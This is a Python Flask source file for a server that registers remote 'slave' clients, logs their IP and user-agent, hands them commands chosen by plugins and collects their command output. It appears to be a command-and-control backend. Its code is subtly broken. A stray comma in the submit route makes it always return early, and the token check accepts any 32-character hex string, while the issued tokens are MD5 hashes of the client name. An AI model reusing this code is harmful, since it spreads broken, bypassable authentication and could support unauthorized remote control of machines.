import pika, time, json, hashlib, re
from flask import Flask, request
from plugins import pluginManager
pluginManager.import_plugins()
# TODO Currently the modules are reloaded only once
app = Flask(__name__)
print(pluginManager.matchers)

SLAVE_TOKEN_REGEX = re.compile('^[a-f0-9]{32}$')

def validate_client_token(request):
    slave_token = request.form.get('token', '')
    print(SLAVE_TOKEN_REGEX.match(slave_token))
    if not SLAVE_TOKEN_REGEX.match(slave_token):
        print('Unauthorized slave trying to receive commands')
        return 'Unauthorized', 401
    print('Returning slave token', slave_token)
    return slave_token



@app.route('/connect/<slave_name>', methods=['POST'])
def slave_connection(slave_name):
    print('Slave {} trying to connect.'.format(slave_name))
    slave_version = request.form.get('version', '?')
    try:
        channel.basic_publish(exchange='history', routing_key='connections', 
                              body=json.dumps({'name': slave_name, 'version': slave_version,
                                               'ip_address': request.remote_addr,
                                               'user-agent': request.headers.get('User-Agent'),
                                               'timestamp': int(time.time())
                                               }))
    except Exception as e:
        print('ERROR: Exception ', e)
        return 'Internal server error', 500
    return json.dumps({'status': 'success', 'message': 'Connection received successfully',
                       'token': hashlib.md5(slave_name.encode()).hexdigest()}), 200

@app.route('/fetch/<slave_name>', methods=['GET'])
def slave_fetch(slave_name):
    print('Slave {} trying to pull commands from server.'.format(slave_name))
    token = validate_client_token(request)
    if isinstance(token, tuple):
        return token
    commands_to_do = {}
    print('Matcher: ', pluginManager.matchers)
    for matcher in pluginManager.matchers:
        result = matcher(slave_name)
        if result in pluginManager.commands.keys():
            payload = pluginManager.commands[result](slave_name)
            commands_to_do[result] = payload
    return json.dumps({'commands': commands_to_do}), 200

    
@app.route('/submit/<slave_name>', methods=['POST'])
def slave_submit(slave_name):
    print('Slave {} trying to submit data to server.'.format(slave_name))
    token = validate_client_token(request),
    if isinstance(token, tuple):
        return token
    output = request.form.get('stdout')
    command = request.form.get('command')
    pluginManager.reactors[command](output)



def rabbitmq_init():
    # Initalizing connection to the RabbitMQ
    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
    global channel
    channel = connection.channel()
    channel.basic_qos(prefetch_count=1)
    # Declaring all exchanges
    channel.exchange_declare(exchange='outcome', type='direct')
    channel.exchange_declare(exchange='log', type='fanout')
    channel.exchange_declare(exchange='history', type='direct')
    # Declaring all queues
    channel.queue_declare('outcome', durable=True)
    channel.queue_declare('log', durable=True)
    channel.queue_declare('history', durable=True)
    # Binds all exchanges to queues
    channel.queue_bind(exchange='outcome', queue='outcome')
    channel.queue_bind(exchange='history', queue='history', routing_key='connections')
    channel.queue_bind(exchange='history', queue='history', routing_key='actions')
    channel.queue_bind(exchange='log', queue='log', routing_key='info')
    channel.queue_bind(exchange='log', queue='log', routing_key='fatal')

if __name__ == '__main__':
    try:
        rabbitmq_init()
    except Exception as e: # Except the pika exceptio
        print('Failed to initalize rabbitMQ, Trying 1 more time')
        rabbitmq_init()
    app.run('0.0.0.0')
